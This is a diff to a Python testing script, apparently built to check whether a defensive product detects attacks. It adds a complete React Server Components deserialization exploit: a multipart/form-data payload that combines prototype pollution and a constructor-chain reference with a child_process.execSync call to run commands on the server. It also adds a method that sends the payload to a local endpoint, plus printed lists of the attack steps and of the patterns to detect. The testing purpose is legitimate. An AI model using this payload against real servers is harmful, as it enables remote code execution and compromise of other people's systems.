@@ -2,6 +2,7 @@
 """
 Deserialization Attack Testing Script
 Tests prototype pollution and unsafe deserialization vulnerabilities
+Including React Server Components (RSC) multipart/form-data attacks
 
 WARNING: Use only in authorized testing environments!
 """
@@ -9,11 +10,56 @@ WARNING: Use only in authorized testing environments!
 import requests
 import json
 import sys
-from typing import Dict, Any
+from typing import Dict, Any, Tuple
 
 # Target server configuration
 TARGET_URL = "http://localhost:3000"
 TIMEOUT = 10
+
+def create_exploit_payload(command: str) -> Tuple[str, str]:
+    """
+    Create the RSC RCE exploit payload using multipart/form-data
+
+    This mimics React Server Components serialization format and exploits:
+    1. Prototype pollution via __proto__
+    2. Constructor chain manipulation
+    3. Command execution via child_process
+
+    Returns: (multipart_body, boundary)
+    """
+    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+    # The malicious payload targeting RSC deserialization
+    payload = json.dumps({
+        "then": "$1:__proto__:then",
+        "status": "resolved_model",
+        "reason": -1,
+        "value": '{"then": "$B0"}',
+        "_response": {
+            "_formData": {
+                "get": "$3:constructor:constructor"
+            },
+            "_prefix": f"process.mainModule.require('child_process').execSync('{command}')//"
+        }
+    }, separators=(',', ':'))
+
+    # Construct multipart/form-data body
+    parts = [
+        f'--{boundary}',
+        'Content-Disposition: form-data; name="0"',
+        '', payload,
+        f'--{boundary}',
+        'Content-Disposition: form-data; name="1"',
+        '', '"$@0"',
+        f'--{boundary}',
+        'Content-Disposition: form-data; name="3"',
+        '', '[]',
+        f'--{boundary}--'
+    ]
+
+    body = '\r\n'.join(parts)
+    return body, boundary
+
 
 class VulnerabilityTester:
     def __init__(self, base_url: str):
@@ -74,6 +120,72 @@ class VulnerabilityTester:
             print("   ✓ child_process module access")
             print("   ✓ execSync command execution")
             print("   ✓ Suspicious eval() usage")
+
+        except requests.exceptions.RequestException as e:
+            print(f"\n✗ Request failed: {e}")
+        except json.JSONDecodeError as e:
+            print(f"\n✗ Invalid JSON response: {e}")
+            print(f"Raw response: {response.text}")
+
+    def test_rsc_multipart_attack(self, command: str = "id") -> None:
+        """
+        Test RSC-style multipart/form-data deserialization attack
+
+        This is the sophisticated attack that targets React Server Components
+        by sending malicious data as multipart/form-data instead of JSON.
+        """
+        print("\n" + "="*60)
+        print("🔴 TESTING: RSC Multipart Prototype Pollution Attack")
+        print("="*60)
+        print("\n⚠️  This attack targets React Server Components (RSC)")
+        print("   Uses multipart/form-data to bypass JSON-based security checks")
+
+        # Create the exploit payload
+        body, boundary = create_exploit_payload(command)
+
+        print(f"\n📤 Sending multipart payload to {self.base_url}/api/rsc-action")
+        print(f"Command to execute: {command}")
+        print(f"Payload size: {len(body)} bytes")
+        print(f"Boundary: {boundary}")
+
+        # Show payload structure
+        print(f"\nPayload structure:")
+        print("  Field 0: Main malicious object with __proto__ pollution")
+        print("  Field 1: Reference marker ($@0)")
+        print("  Field 3: Empty array")
+
+        try:
+            response = self.session.post(
+                f"{self.base_url}/api/rsc-action",
+                data=body,
+                headers={
+                    "Content-Type": f"multipart/form-data; boundary={boundary}"
+                },
+                timeout=TIMEOUT
+            )
+
+            print(f"\n📥 Response Status: {response.status_code}")
+            print(f"Response:")
+            result = response.json()
+            print(json.dumps(result, indent=2))
+
+            # Explain the attack
+            print("\n🎯 ATTACK EXPLANATION:")
+            print("   1. Sends data as multipart/form-data (not JSON)")
+            print("   2. Each form field contains part of malicious object")
+            print("   3. Server reconstructs object using eval() on each field")
+            print("   4. Prototype pollution occurs via __proto__")
+            print("   5. Constructor chain ($3:constructor:constructor) accessed")
+            print("   6. Command executed via child_process in _prefix field")
+
+            print("\n🛡️  DEFENSIVE PRODUCT SHOULD DETECT:")
+            print("   ✓ Multipart form data with suspicious structure")
+            print("   ✓ __proto__ keyword in form field values")
+            print("   ✓ RSC serialization markers ($1:, $@, $B)")
+            print("   ✓ constructor:constructor chain patterns")
+            print("   ✓ child_process.execSync in form data")
+            print("   ✓ process.mainModule.require patterns")
+            print("   ✓ Eval usage on multipart field values")
 
         except requests.exceptions.RequestException as e:
             print(f"\n✗ Request failed: {e}")
@@ -157,20 +269,36 @@ def main():
     }
 
     # Run tests
+    print("\n🎯 RUNNING ATTACK SCENARIOS:\n")
+
+    # Test 1: RSC Multipart Attack (YOUR EXPLOIT!)
+    tester.test_rsc_multipart_attack(command="id")
+
+    # Test 2: Traditional JSON deserialization
     tester.test_deserialization_attack(advanced_payload)
+
+    # Test 3: Simple deserialization attacks
     tester.test_simple_deserialization()
 
     # Summary
     print("\n" + "="*60)
     print("📊 TESTING COMPLETE")
     print("="*60)
-    print("\nYour defensive product should have detected:")
+    print("\n✅ ATTACKS TESTED:")
+    print("  1. RSC Multipart/Form-Data Prototype Pollution")
+    print("  2. JSON-based Deserialization with __proto__")
+    print("  3. Simple eval() RCE attacks")
+    print("\n🛡️  YOUR DEFENSIVE PRODUCT SHOULD HAVE DETECTED:")
     print("  • Prototype pollution attempts (__proto__)")
-    print("  • Unsafe deserialization patterns")
-    print("  • Command execution via child_process")
+    print("  • Multipart form data with suspicious JSON strings")
+    print("  • RSC serialization markers ($1:, $@0, $B0)")
     print("  • Constructor chain manipulation")
-    print("  • Process/environment access attempts")
-    print("\nIf these were NOT detected, your defensive product needs improvement!")
+    print("  • child_process module access")
+    print("  • execSync/exec command execution")
+    print("  • process.mainModule.require patterns")
+    print("  • Unsafe deserialization patterns")
+    print("  • eval() usage on untrusted data")
+    print("\n⚠️  If these were NOT detected, your defensive product needs improvement!")
     print("="*60)
 
 
